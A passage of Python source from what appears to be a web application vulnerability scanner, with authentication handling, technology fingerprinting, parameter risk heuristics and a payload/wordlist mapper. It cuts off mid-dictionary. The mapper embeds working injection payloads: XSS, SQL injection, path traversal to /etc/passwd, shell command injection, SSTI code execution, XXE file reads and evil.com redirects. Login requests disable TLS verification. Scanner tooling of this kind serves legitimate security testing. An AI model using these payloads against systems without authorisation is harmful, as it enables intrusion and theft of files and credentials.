            'oauth2': self.setup_oauth2_auth
        }
        self.session = None
        self.auth_config = None
        self.debug_logger = debug_logger
        self.is_authenticated = False
        self.auth_type_used = None
        self.csrf_token = None

    def _log_auth_event(self, action: str, details: dict = None,
                       success: bool = True, error: str = None):
        """Log authentication event to debug logger"""
        if self.debug_logger:
            self.debug_logger.log_auth_event(
                auth_type=self.auth_type_used or 'unknown',
                action=action,
                details=details or {},
                success=success,
                error=error
            )
        # Also log to standard logger
        if success:
            logger.info(f"Auth [{action}]: {details}")
        else:
            logger.error(f"Auth [{action}] FAILED: {error or details}")

    def setup_authentication(self, session, auth_config) -> bool:
        """
        Configure authentication for the session.

        Args:
            session: requests.Session object
            auth_config: Authentication configuration dict

        Returns:
            True if authentication was successful, False otherwise
        """
        self.session = session
        self.auth_config = auth_config

        if not auth_config:
            logger.warning("No authentication configuration provided")
            return False

        auth_type = auth_config.get('type', '').lower()
        self.auth_type_used = auth_type

        self._log_auth_event('setup_start', {'type': auth_type})

        if auth_type in self.auth_types:
            try:
                result = self.auth_types[auth_type](auth_config)
                self.is_authenticated = result

                if result:
                    self._log_auth_event('setup_complete', {'type': auth_type}, success=True)
                else:
                    self._log_auth_event('setup_failed', {'type': auth_type}, success=False)

                return result
            except Exception as e:
                self._log_auth_event('setup_error', {'type': auth_type},
                                    success=False, error=str(e))
                logger.exception(f"Authentication setup error: {e}")
                return False
        else:
            self._log_auth_event('unknown_type', {'type': auth_type},
                                success=False, error=f"Unknown auth type: {auth_type}")
            logger.error(f"Unknown authentication type: {auth_type}")
            return False

    def setup_basic_auth(self, config) -> bool:
        """Setup HTTP Basic Authentication"""
        username = config.get('username')
        password = config.get('password')

        if not username or not password:
            self._log_auth_event('basic_auth',
                                {'error': 'missing credentials'}, success=False)
            return False

        self.session.auth = (username, password)
        self._log_auth_event('basic_auth', {'username': username}, success=True)
        logger.info(f"Basic auth configured for user: {username}")
        return True

    def setup_bearer_auth(self, config) -> bool:
        """Setup Bearer token authentication"""
        token = config.get('token')

        if not token:
            self._log_auth_event('bearer_auth',
                                {'error': 'missing token'}, success=False)
            return False

        self.session.headers.update({
            'Authorization': f'Bearer {token}'
        })
        self._log_auth_event('bearer_auth',
                            {'token_length': len(token)}, success=True)
        logger.info("Bearer token authentication configured")
        return True

    def setup_cookie_auth(self, config) -> bool:
        """Setup cookie-based authentication"""
        cookies = config.get('cookies', {})

        if not cookies:
            self._log_auth_event('cookie_auth',
                                {'error': 'no cookies provided'}, success=False)
            return False

        for name, value in cookies.items():
            self.session.cookies.set(name, value)

        self._log_auth_event('cookie_auth',
                            {'cookie_count': len(cookies),
                             'cookie_names': list(cookies.keys())}, success=True)
        logger.info(f"Cookie authentication configured with {len(cookies)} cookies")
        return True

    def setup_custom_header_auth(self, config) -> bool:
        """Setup custom header authentication"""
        headers = config.get('headers', {})

        if not headers:
            self._log_auth_event('custom_header_auth',
                                {'error': 'no headers provided'}, success=False)
            return False

        self.session.headers.update(headers)
        self._log_auth_event('custom_header_auth',
                            {'header_count': len(headers),
                             'header_names': list(headers.keys())}, success=True)
        logger.info(f"Custom header authentication configured with {len(headers)} headers")
        return True

    def setup_oauth2_auth(self, config) -> bool:
        """Setup OAuth2 client credentials authentication"""
        token_url = config.get('token_url')
        client_id = config.get('client_id')
        client_secret = config.get('client_secret')
        scope = config.get('scope', '')

        if not all([token_url, client_id, client_secret]):
            self._log_auth_event('oauth2_auth',
                                {'error': 'missing oauth2 parameters'}, success=False)
            return False

        try:
            # Request access token
            token_data = {
                'grant_type': 'client_credentials',
                'client_id': client_id,
                'client_secret': client_secret,
            }
            if scope:
                token_data['scope'] = scope

            response = self.session.post(token_url, data=token_data, timeout=30)

            if response.status_code == 200:
                token_response = response.json()
                access_token = token_response.get('access_token')

                if access_token:
                    self.session.headers.update({
                        'Authorization': f'Bearer {access_token}'
                    })
                    self._log_auth_event('oauth2_auth',
                                        {'token_type': token_response.get('token_type'),
                                         'expires_in': token_response.get('expires_in')},
                                        success=True)
                    logger.info("OAuth2 authentication successful")
                    return True

            self._log_auth_event('oauth2_auth',
                                {'status_code': response.status_code}, success=False)
            return False

        except Exception as e:
            self._log_auth_event('oauth2_auth', {}, success=False, error=str(e))
            logger.error(f"OAuth2 authentication error: {e}")
            return False

    def _extract_csrf_token(self, response) -> Optional[str]:
        """
        Extract CSRF token from response.

        Searches in:
        - HTML form hidden fields
        - Meta tags
        - Response headers
        - Cookies
        """
        csrf_token = None

        # 1. Search in HTML form fields
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            for field_name in self.CSRF_FIELD_NAMES:
                # Check input fields
                input_field = soup.find('input', {'name': field_name})
                if input_field and input_field.get('value'):
                    csrf_token = input_field.get('value')
                    self._log_auth_event('csrf_found',
                                        {'source': 'input_field', 'name': field_name})
                    break

                # Check meta tags
                meta_tag = soup.find('meta', {'name': field_name})
                if meta_tag and meta_tag.get('content'):
                    csrf_token = meta_tag.get('content')
                    self._log_auth_event('csrf_found',
                                        {'source': 'meta_tag', 'name': field_name})
                    break
        except Exception as e:
            logger.debug(f"CSRF extraction from HTML failed: {e}")

        # 2. Search in response headers
        if not csrf_token:
            for header_name in self.CSRF_HEADER_NAMES:
                if header_name in response.headers:
                    csrf_token = response.headers[header_name]
                    self._log_auth_event('csrf_found',
                                        {'source': 'header', 'name': header_name})
                    break

        # 3. Search in cookies
        if not csrf_token:
            for cookie_name in ['XSRF-TOKEN', 'csrf_token', 'csrftoken']:
                if cookie_name in response.cookies:
                    csrf_token = response.cookies[cookie_name]
                    self._log_auth_event('csrf_found',
                                        {'source': 'cookie', 'name': cookie_name})
                    break

        return csrf_token

    def _detect_csrf_field_name(self, response) -> str:
        """Detect the CSRF field name used by the form"""
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            for field_name in self.CSRF_FIELD_NAMES:
                if soup.find('input', {'name': field_name}):
                    return field_name
        except:
            pass

        return 'csrf_token'  # Default

    def setup_form_auth(self, config) -> bool:
        """
        Setup form-based authentication with login.

        Improvements:
        - Automatic extraction of ALL form fields (hidden, submit, csrf)
        - Pre-login page fetch for session cookies
        - Better success detection
        - No need for extra_fields in most cases
        """
        login_url = config.get('login_url')
        username_field = config.get('username_field', 'username')
        password_field = config.get('password_field', 'password')
        username = config.get('username')
        password = config.get('password')

        if not all([login_url, username, password]):
            self._log_auth_event('form_auth',
                                {'error': 'missing required parameters',
                                 'has_url': bool(login_url),
                                 'has_user': bool(username),
                                 'has_pass': bool(password)}, success=False)
            logger.error("Missing required form auth parameters")
            return False

        try:
            # Step 1: Fetch login page to get session cookies and form fields
            self._log_auth_event('form_auth_step1', {'action': 'fetching login page'})

            pre_login_response = self.session.get(login_url, timeout=30, verify=False)

            if pre_login_response.status_code != 200:
                self._log_auth_event('form_auth',
                                    {'error': f'login page returned {pre_login_response.status_code}'},
                                    success=False)
                logger.error(f"Failed to fetch login page: {pre_login_response.status_code}")
                return False

            # Step 2: Extract ALL form fields automatically
            login_data = {}

            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(pre_login_response.text, 'html.parser')

                # Find the login form
                form = soup.find('form')
                if form:
                    # Extract ALL input fields from the form
                    for inp in form.find_all('input'):
                        name = inp.get('name')
                        if not name:
                            continue

                        input_type = inp.get('type', 'text').lower()
                        value = inp.get('value', '')

                        if input_type == 'hidden':
                            # Include all hidden fields (CSRF tokens, etc.)
                            login_data[name] = value
                            logger.info(f"Found hidden field: {name}")
                        elif input_type == 'submit':
                            # Include submit button
                            login_data[name] = value
                            logger.info(f"Found submit button: {name}={value}")
                        # Skip text/password - we'll add those with user values

                    logger.info(f"Extracted {len(login_data)} fields from form")
                else:
                    logger.warning("No form found, using fallback CSRF extraction")
                    # Fallback to CSRF-only extraction
                    csrf_token = self._extract_csrf_token(pre_login_response)
                    csrf_field = self._detect_csrf_field_name(pre_login_response)
                    if csrf_token and csrf_field:
                        login_data[csrf_field] = csrf_token

            except ImportError:
                logger.warning("BeautifulSoup not available, using regex extraction")
                # Fallback to CSRF extraction
                csrf_token = self._extract_csrf_token(pre_login_response)
                csrf_field = self._detect_csrf_field_name(pre_login_response)
                if csrf_token and csrf_field:
                    login_data[csrf_field] = csrf_token

            # Step 3: Add username and password
            login_data[username_field] = username
            login_data[password_field] = password

            # Add any additional fields from config (for special cases)
            extra_fields = config.get('extra_fields', {})
            login_data.update(extra_fields)

            # Log what we're sending (mask password)
            safe_data = {k: ('***' if 'pass' in k.lower() else v) for k, v in login_data.items()}
            logger.info(f"Login POST data: {safe_data}")

            # Step 4: Perform login
            self._log_auth_event('form_auth_step2',
                                {'action': 'submitting login form',
                                 'fields': list(login_data.keys())})

            # Some sites need specific headers
            login_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': login_url,
            }

            response = self.session.post(
                login_url,
                data=login_data,
                headers=login_headers,
                timeout=30,
                verify=False,
                allow_redirects=True
            )

            # Step 5: Check login success
            success = self._check_login_success(response, config)

            if success:
                self._log_auth_event('form_auth_success',
                                    {'username': username,
                                     'final_url': response.url,
                                     'cookies_received': list(self.session.cookies.keys())},
                                    success=True)
                logger.info(f"Form authentication successful for user: {username}")

                # Handle 2FA if required
                if config.get('2fa_required'):
                    return self.handle_2fa(config, response)

                return True
            else:
                self._log_auth_event('form_auth_failed',
                                    {'username': username,
                                     'status_code': response.status_code,
                                     'final_url': response.url},
                                    success=False)
                logger.error("Form authentication failed")
                return False

        except Exception as e:
            self._log_auth_event('form_auth_error',
                                {'error': str(e)}, success=False, error=str(e))
            logger.exception(f"Form authentication error: {e}")
            return False

    def _check_login_success(self, response, config) -> bool:
        """
        Check if login was successful using multiple methods.
        """
        login_url = config.get('login_url', '')

        # Method 1: Check for explicit success indicators
        success_indicators = config.get('success_indicators', [])
        if success_indicators:
            for indicator in success_indicators:
                if indicator in response.text:
                    logger.info(f"Login success: found success indicator '{indicator}'")
                    return True

        # Method 2: Check if redirected away from login page (most reliable)
        if response.url.lower() != login_url.lower() and 'login' not in response.url.lower():
            logger.info(f"Login success: redirected to {response.url}")
            return True

        # Method 3: Check for failure indicators (only if NOT redirected)
        # Use specific failure messages to avoid false positives
        failure_indicators = config.get('failure_indicators', [
            'login failed', 'Login failed', 'invalid username', 'invalid password',
            'incorrect password', 'wrong password', 'authentication failed',
            'access denied', 'bad credentials', 'invalid credentials',
            'CSRF token is incorrect'
        ])
        response_lower = response.text.lower()
        for indicator in failure_indicators:
            if indicator.lower() in response_lower:
                logger.error(f"Login failed: found '{indicator}' in response")
                return False

        # Method 4: Check if login form is no longer present
        if 'type="password"' not in response.text:
            logger.info("Login success: login form no longer present")
            return True

        # Method 5: Real verification - try to access site root
        try:
            from urllib.parse import urlparse, urlunparse
            parsed = urlparse(login_url)
            base_url = urlunparse((parsed.scheme, parsed.netloc, '/', '', '', ''))

            verify_response = self.session.get(base_url, timeout=10, allow_redirects=True)

            if 'login' not in verify_response.url.lower():
                logger.info(f"Login success: verified access to {verify_response.url}")
                return True
            else:
                logger.error(f"Login failed: redirected back to login page")
                return False
        except Exception as e:
            logger.warning(f"Could not verify login via base URL: {e}")

        return False

    def handle_2fa(self, config, login_response) -> bool:
        """Handle two-factor authentication"""
        twofa_url = config.get('2fa_url')
        twofa_field = config.get('2fa_field', 'code')
        twofa_code = config.get('2fa_code')

        if not twofa_url:
            # Try to detect 2FA page from login response
            if '2fa' in login_response.url.lower() or 'verify' in login_response.url.lower():
                twofa_url = login_response.url

        if not twofa_url or not twofa_code:
            self._log_auth_event('2fa_skipped',
                                {'error': 'missing 2fa_url or 2fa_code'}, success=False)
            logger.warning("2FA required but missing configuration")
            return False

        try:
            self._log_auth_event('2fa_attempt', {'url': twofa_url})

            twofa_data = {twofa_field: twofa_code}

            # Check for CSRF on 2FA page
            if self.csrf_token:
                twofa_data['csrf_token'] = self.csrf_token

            response = self.session.post(twofa_url, data=twofa_data, timeout=30, verify=False)

            if response.status_code in [200, 302]:
                self._log_auth_event('2fa_success', {}, success=True)
                logger.info("2FA authentication successful")
                return True
            else:
                self._log_auth_event('2fa_failed',
                                    {'status_code': response.status_code}, success=False)
                logger.error("2FA authentication failed")
                return False

        except Exception as e:
            self._log_auth_event('2fa_error', {}, success=False, error=str(e))
            logger.error(f"2FA error: {e}")
            return False

    def verify_session(self, verify_url: str = None) -> bool:
        """
        Verify that the session is still authenticated.

        Args:
            verify_url: URL to check authentication status

        Returns:
            True if authenticated, False otherwise
        """
        if not verify_url:
            return self.is_authenticated

        try:
            response = self.session.get(verify_url, timeout=15, verify=False)

            # Check if we got redirected to login page
            if 'login' in response.url.lower():
                self.is_authenticated = False
                return False

            # Check for common "not authenticated" indicators
            unauth_indicators = ['please log in', 'login required', 'session expired']
            for indicator in unauth_indicators:
                if indicator in response.text.lower():
                    self.is_authenticated = False
                    return False

            return True

        except Exception as e:
            logger.error(f"Session verification error: {e}")
            return False

    def get_auth_status(self) -> dict:
        """Get current authentication status"""
        return {
            'is_authenticated': self.is_authenticated,
            'auth_type': self.auth_type_used,
            'has_csrf_token': self.csrf_token is not None,
            'session_cookies': list(self.session.cookies.keys()) if self.session else []
        }


class TechnologyDetector:
    """Detect technologies, frameworks, and libraries used by the target"""
    
    def __init__(self):
        self.tech_signatures = {
            'cms': {
                'wordpress': {
                    'headers': ['X-Powered-By: WordPress'],
                    'paths': ['/wp-content/', '/wp-includes/', '/wp-admin/'],
                    'meta': ['generator.*wordpress', 'wp-'],
                    'cookies': ['wordpress_'],
                    'confidence': 0
                },
                'drupal': {
                    'headers': ['X-Generator: Drupal'],
                    'paths': ['/sites/default/', '/modules/', '/misc/drupal.js'],
                    'meta': ['generator.*drupal'],
                    'cookies': ['SESS'],
                    'confidence': 0
                },
                'joomla': {
                    'headers': ['X-Content-Encoded-By: Joomla'],
                    'paths': ['/components/', '/modules/', '/templates/', '/plugins/'],
                    'meta': ['generator.*joomla'],
                    'cookies': [],
                    'confidence': 0
                }
            },
            'languages': {
                'php': {
                    'headers': ['X-Powered-By: PHP', 'Server:.*PHP'],
                    'extensions': ['.php', '.php3', '.php4', '.php5', '.phtml'],
                    'cookies': ['PHPSESSID'],
                    'confidence': 0
                },
                'asp.net': {
                    'headers': ['X-Powered-By: ASP.NET', 'X-AspNet-Version'],
                    'extensions': ['.aspx', '.asp', '.asmx'],
                    'cookies': ['ASP.NET_SessionId'],
                    'confidence': 0
                },
                'java': {
                    'headers': ['X-Powered-By:.*Servlet', 'Server:.*Tomcat'],
                    'extensions': ['.jsp', '.do', '.action'],
                    'cookies': ['JSESSIONID'],
                    'confidence': 0
                },
                'python': {
                    'headers': ['Server:.*Python', 'X-Powered-By:.*Python'],
                    'extensions': ['.py'],
                    'cookies': [],
                    'confidence': 0
                }
            },
            'frameworks': {
                'laravel': {
                    'headers': [],
                    'cookies': ['laravel_session'],
                    'paths': ['/storage/', '/public/'],
                    'confidence': 0
                },
                'django': {
                    'headers': [],
                    'cookies': ['csrftoken', 'sessionid'],
                    'paths': ['/static/', '/media/'],
                    'confidence': 0
                },
                'spring': {
                    'headers': ['X-Application-Context'],
                    'paths': ['/actuator/', '/swagger-ui.html'],
                    'cookies': [],
                    'confidence': 0
                },
                'express': {
                    'headers': ['X-Powered-By: Express'],
                    'cookies': ['connect.sid'],
                    'paths': [],
                    'confidence': 0
                }
            },
            'servers': {
                'nginx': {
                    'headers': ['Server:.*nginx'],
                    'confidence': 0
                },
                'apache': {
                    'headers': ['Server:.*Apache'],
                    'confidence': 0
                },
                'iis': {
                    'headers': ['Server:.*IIS', 'X-Powered-By: ASP.NET'],
                    'confidence': 0
                }
            }
        }
    
    def detect(self, response, url):
        """Analyze response to detect technologies"""
        detected = {
            'cms': None,
            'language': None,
            'framework': None,
            'server': None,
            'javascript_libs': [],
            'headers': dict(response.headers),
            'cookies': list(response.cookies.keys())
        }
        
        # Check headers
        for category, technologies in self.tech_signatures.items():
            if category == 'javascript_libs':
                continue
                
            for tech, signatures in technologies.items():
                confidence = 0
                
                # Check headers
                if 'headers' in signatures:
                    for header_pattern in signatures['headers']:
                        for header, value in response.headers.items():
                            if re.search(header_pattern, f"{header}: {value}", re.I):
                                confidence += 40
                
                # Check cookies
                if 'cookies' in signatures:
                    for cookie_pattern in signatures['cookies']:
                        for cookie in response.cookies:
                            if cookie_pattern.lower() in cookie.lower():
                                confidence += 30
                
                # Check paths in HTML
                if 'paths' in signatures and response.text:
                    for path in signatures['paths']:
                        if path in response.text:
                            confidence += 20
                
                # Check meta tags
                if 'meta' in signatures and response.text:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for meta in soup.find_all('meta'):
                        meta_str = str(meta)
                        for pattern in signatures['meta']:
                            if re.search(pattern, meta_str, re.I):
                                confidence += 30
                
                # Check file extensions in URL
                if 'extensions' in signatures:
                    for ext in signatures['extensions']:
                        if url.endswith(ext):
                            confidence += 25
                
                # Update if this is the highest confidence for this category
                if confidence > 50:
                    if category in detected and detected[category]:
                        if confidence > self.tech_signatures[category][detected[category]]['confidence']:
                            detected[category] = tech
                            self.tech_signatures[category][tech]['confidence'] = confidence
                    else:
                        detected[category] = tech
                        self.tech_signatures[category][tech]['confidence'] = confidence
        
        # Detect JavaScript libraries
        detected['javascript_libs'] = self._detect_js_libs(response.text if response.text else "")
        
        return detected
    
    def _detect_js_libs(self, html):
        """Detect JavaScript libraries from HTML content"""
        js_libs = []
        
        patterns = {
            'jquery': r'jquery[.-]?([\d.]+)?\.?(min)?\.js',
            'angular': r'angular[.-]?([\d.]+)?\.?(min)?\.js',
            'react': r'react[.-]?([\d.]+)?\.?(min)?\.js',
            'vue': r'vue[.-]?([\d.]+)?\.?(min)?\.js',
            'bootstrap': r'bootstrap[.-]?([\d.]+)?\.?(min)?\.js',
            'lodash': r'lodash[.-]?([\d.]+)?\.?(min)?\.js',
            'moment': r'moment[.-]?([\d.]+)?\.?(min)?\.js'
        }
        
        for lib, pattern in patterns.items():
            if re.search(pattern, html, re.I):
                js_libs.append(lib)
        
        return js_libs


class ParameterAnalyzer:
    """Analyze parameters for vulnerability indicators"""

    def __init__(self):
        # Parametri che suggeriscono query SQL
        self.sql_params = ['id', 'user_id', 'product_id', 'cat', 'category', 'item',
                          'sort', 'order', 'limit', 'offset', 'search', 'q', 'query']
        # Parametri che suggeriscono inclusione file - RIMOSSO 'name', 'page' troppo generici
        self.file_params = ['file', 'path', 'document', 'folder', 'include',
                           'template', 'view', 'module', 'load', 'dir', 'filepath']
        # Parametri che suggeriscono esecuzione comandi
        self.cmd_params = ['cmd', 'exec', 'command', 'execute', 'ping', 'system', 'do', 'func', 'ip']
        # Parametri che suggeriscono XML
        self.xxe_params = ['xml', 'data', 'input', 'payload', 'doc', 'document']
        # Parametri che suggeriscono template - RIMOSSO 'name' troppo generico
        self.ssti_params = ['template', 'render', 'engine', 'tpl']

    def analyze_parameter(self, param_name, param_value, response_text, content_type=""):
        """
        Analyze a parameter for vulnerability indicators.

        PRIORITÀ INTELLIGENTE:
        1. Se il valore è riflesso nella risposta → XSS ha priorità massima
        2. Solo se NON c'è reflection, considera altri tipi basati sul nome
        """
        vulnerabilities = []
        param_name_lower = param_name.lower()
        param_value_str = str(param_value) if param_value else ""

        # ===== STEP 1: Check for reflection (PRIORITÀ XSS) =====
        has_reflection = False
        reflection_context = None

        if param_value_str and response_text and param_value_str in response_text:
            reflection_context = self._get_reflection_context(param_value_str, response_text)
            if reflection_context:
                has_reflection = True
                # XSS con alta confidenza se c'è reflection in contesto HTML/attributo
                confidence = 90 if reflection_context in ['html', 'attribute'] else 70
                vulnerabilities.append({
                    'type': 'xss',
                    'confidence': confidence,
                    'context': reflection_context,
                    'evidence': f'Parameter value reflected in {reflection_context} context',
                    'priority': 1  # Massima priorità
                })

        # ===== STEP 2: SQL Injection indicators =====
        if param_name_lower in self.sql_params or re.search(r'(id|ID|Id)$', param_name):
            vulnerabilities.append({
                'type': 'sqli',
                'confidence': 70,
                'context': 'database_parameter',
                'evidence': f'Parameter name suggests database query: {param_name}',
                'priority': 2
            })

        # ===== STEP 3: File Inclusion - SOLO se il nome è specifico per file =====
        if param_name_lower in self.file_params:
            vulnerabilities.append({
                'type': 'lfi',
                'confidence': 70,
                'context': 'file_parameter',
                'evidence': f'Parameter name suggests file operation: {param_name}',
                'priority': 2
            })
        # 'page' può essere LFI ma con confidenza minore
        if param_name_lower == 'page' and not has_reflection:
            vulnerabilities.append({
                'type': 'lfi',
                'confidence': 50,
                'context': 'file_parameter',
                'evidence': f'Parameter "page" might accept file paths',
                'priority': 3
            })

        # ===== STEP 4: Command Injection indicators =====
        if param_name_lower in self.cmd_params:
            vulnerabilities.append({
                'type': 'rce',
                'confidence': 70,
                'context': 'command_parameter',
                'evidence': f'Parameter name suggests command execution: {param_name}',
                'priority': 2
            })

        # ===== STEP 5: XXE indicators =====
        if param_name_lower in self.xxe_params or 'xml' in content_type.lower():
            vulnerabilities.append({
                'type': 'xxe',
                'confidence': 60,
                'context': 'xml_parameter',
                'evidence': f'Parameter appears to accept XML data: {param_name}',
                'priority': 3
            })

        # ===== STEP 6: SSTI - SOLO se parametro specifico E NO reflection =====
        if param_name_lower in self.ssti_params and not has_reflection:
            vulnerabilities.append({
                'type': 'ssti',
                'confidence': 50,
                'context': 'template_parameter',
                'evidence': f'Parameter name suggests template usage: {param_name}',
                'priority': 3
            })

        # ===== STEP 7: Open Redirect indicators =====
        if param_name_lower in ['url', 'link', 'redirect', 'return', 'next', 'callback', 'goto']:
            vulnerabilities.append({
                'type': 'open_redirect',
                'confidence': 60,
                'context': 'redirect_parameter',
                'evidence': f'Parameter name suggests redirection: {param_name}',
                'priority': 3
            })

        # ===== STEP 8: LDAP Injection - SOLO per parametri auth specifici =====
        if param_name_lower in ['username', 'user', 'uid', 'cn', 'dn', 'ldap']:
            vulnerabilities.append({
                'type': 'ldapi',
                'confidence': 40,
                'context': 'authentication_parameter',
                'evidence': f'Parameter used for authentication: {param_name}',
                'priority': 4
            })

        # Ordina per priorità (1 = massima)
        vulnerabilities.sort(key=lambda x: (x.get('priority', 5), -x.get('confidence', 0)))

        return vulnerabilities
    
    def _get_reflection_context(self, value, html):
        """Determine the context where a value is reflected"""
        # Create patterns to check different contexts
        contexts = {
            'html': rf'>[^<]*{re.escape(value)}[^>]*<',
            'attribute': rf'=["\']?[^"\']*{re.escape(value)}[^"\']*["\']?[\s>]',
            'javascript': rf'<script[^>]*>[^<]*{re.escape(value)}[^<]*</script>',
            'css': rf'<style[^>]*>[^<]*{re.escape(value)}[^<]*</style>',
            'comment': rf'<!--[^>]*{re.escape(value)}[^>]*-->'
        }
        
        for context, pattern in contexts.items():
            if re.search(pattern, html, re.I | re.S):
                return context
        
        return None


class WordlistMapper:
    """Map vulnerabilities to appropriate wordlists"""

    # ========== INTERNAL FALLBACK PAYLOADS ==========
    # Usati quando i wordlist esterni non sono disponibili
    INTERNAL_PAYLOADS = {
        'xss': [
            # Payload semplici ed efficaci per XSS
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<img src=x onerror="alert(1)">',
            '<ScRiPt>alert(1)</sCrIpT>',
            '<IMG SRC="javascript:alert(1);">',
            '<a href="javascript:alert(1)">click</a>',
            '"><img src=x onerror=alert(1)>',
            "' onfocus=alert(1) autofocus='",
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '{{constructor.constructor("alert(1)")()}}',  # Angular
            '${alert(1)}',  # Template literal
        ],
        'sqli': [
            # SQL Injection payloads
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "1' OR '1'='1",
            "admin'--",
            "1 OR 1=1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "-1 UNION SELECT 1,2,3--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        ],
        'lfi': [
            # LFI payloads
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '/etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '/proc/self/environ',
            '....//....//....//windows/win.ini',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://input',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
        ],
        'rce': [
            # RCE payloads
            '; id',
            '| id',
            '`id`',
            '$(id)',
            '; whoami',
            '| whoami',
            '& whoami',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; ping -c 3 127.0.0.1',
            '| ping -c 3 127.0.0.1',
            '; sleep 5',
            '| sleep 5',
            '& dir',
            '| type c:\\windows\\win.ini',
        ],
        'ssti': [
            # SSTI payloads
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '<%= 7*7 %>',
            '{{config}}',
            '{{self}}',
            '{{"".__class__}}',
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
            '{{request}}',
            '${request}',
        ],
        'xxe': [
            # XXE payloads
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ],
        'ldapi': [
            # LDAP Injection
            '*',
            '*)(&',
            '*)(uid=*))(|(uid=*',
            'admin*',
            '*)(objectClass=*',
        ],
        'open_redirect': [
            # Open Redirect
            '//evil.com',
            'https://evil.com',
            '//evil.com/%2f..',
            '/\\evil.com',
            '////evil.com',
        ],
    }

    def __init__(self, base_paths=None):
        self.base_paths = base_paths or {
            'fuzzdb': '/usr/share/wordlists/fuzzdb',
            'payloads': '/usr/share/wordlists/PayloadsAllTheThings',
            'seclists': '/usr/share/wordlists/SecLists'
        }

        self.wordlist_map = {
            'xss': {
                'fuzzdb': [
                    'attack/xss/xss-rsnake.txt',
                    'attack/xss/xss-other.txt',
                    'attack/xss/XSSPolyglot.txt'
                ],
                'payloads': [
                    'XSS Injection/Intruders/JHADDIX_XSS.txt',
                    'XSS Injection/Intruders/XSS_Polyglots.txt',
                    'XSS Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt'
                ],
                'seclists': [
                    'Fuzzing/XSS/XSS-BruteLogic.txt',
                    'Fuzzing/XSS/XSS-Jhaddix.txt',
                    'Fuzzing/Polyglots/XSS-Polyglots.txt'
                ]
            },
            'sqli': {
                'fuzzdb': [
                    'attack/sql-injection/detect/Generic_SQLI.txt',
                    'attack/sql-injection/detect/MySQL.txt',
                    'attack/sql-injection/detect/MSSQL.txt'
                ],
                'payloads': [
                    'SQL Injection/Intruder/Generic_Fuzz.txt',
                    'SQL Injection/Intruder/SQLi_Polyglots.txt',
                    'SQL Injection/Intruder/Auth_Bypass.txt'
                ],
                'seclists': [
                    'Fuzzing/SQLi/Generic-SQLi.txt',
                    'Fuzzing/SQLi/quick-SQLi.txt',
                    'Fuzzing/Databases/MySQL.fuzzdb.txt'
                ]
            },
            'lfi': {
                'fuzzdb': [
                    'attack/lfi/JHADDIX_LFI.txt',
                    'attack/path-traversal/traversals-8-deep-exotic-encoding.txt'
                ],
                'payloads': [
                    'File Inclusion/Intruders/JHADDIX_LFI.txt',
                    'File Inclusion/Intruders/LFI-WindowsFileCheck.txt',
                    'Directory Traversal/Intruder/directory_traversal.txt'
                ],
                'seclists': [
                    'Fuzzing/LFI/LFI-Jhaddix.txt',
                    'Fuzzing/LFI/LFI-gracefulsecurity-linux.txt',
                    'Fuzzing/LFI/LFI-gracefulsecurity-windows.txt'
                ]
            },
            'rce': {
                'fuzzdb': [
                    'attack/os-cmd-execution/command-execution-unix.txt',
                    'attack/os-cmd-execution/Commands-Windows.txt'
                ],
                'payloads': [
                    'Command Injection/Intruder/command_exec.txt',
                    'Command Injection/README.md'
                ],
                'seclists': [
                    'Fuzzing/command-injection-commix.txt'
                ]
            },
            'xxe': {
                'fuzzdb': [
                    'attack/xml/xml-attacks.txt'
                ],
                'payloads': [
                    'XXE Injection/Files/Classic XXE.xml',
                    'XXE Injection/Intruders/XXE_Fuzzing.txt'
                ],
                'seclists': [
                    'Fuzzing/XXE-Fuzzing.txt'
                ]
            },
            'ssti': {
                'payloads': [
                    'Server Side Template Injection/Intruder/ssti.fuzz'
                ],
                'seclists': [
                    'Fuzzing/template-engines-special-vars.txt',
                    'Fuzzing/template-engines-expression.txt'
                ]
            },
            'file_upload': {
                'fuzzdb': [
                    'attack/file-upload/alt-extensions-php.txt',
                    'attack/file-upload/file-ul-filter-bypass-x-platform-php.txt'
                ],
                'payloads': [
                    'Upload Insecure Files/Extension PHP/',
                    'Upload Insecure Files/Picture Metadata/'
                ]
            },
            'open_redirect': {
                'payloads': [
                    'Open Redirect/Intruder/Open-Redirect-payloads.txt'
                ]
            },
            'ldapi': {
                'fuzzdb': [
                    'attack/ldap/ldap-injection.txt'
                ],
                'payloads': [
                    'LDAP Injection/Intruder/LDAP_FUZZ.txt'
                ],
                'seclists': [
                    'Fuzzing/LDAP.Fuzzing.txt'
                ]
            },
            # Extended vulnerability types
            'idor': {
                'seclists': [
                    'Fuzzing/ID-References.txt'
                ]
            },
            'path_traversal': {
                'fuzzdb': [
